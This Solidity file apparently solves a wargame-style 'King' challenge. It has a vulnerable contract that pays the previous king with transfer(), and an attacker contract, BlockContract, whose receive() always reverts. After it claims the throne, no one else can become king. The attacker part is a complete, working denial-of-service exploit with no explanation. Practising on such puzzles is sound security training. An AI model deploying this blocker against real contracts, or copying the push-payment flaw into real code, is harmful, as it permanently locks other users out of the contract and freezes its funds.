// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract BlockContract {
    receive() external payable {
        revert();
    }

    function beKing(King kingContract) external payable {
        uint256 prize = kingContract.prize();
        (bool success,) = address(kingContract).call{value: prize}("");
        require(success, "Fail Call");
    }
}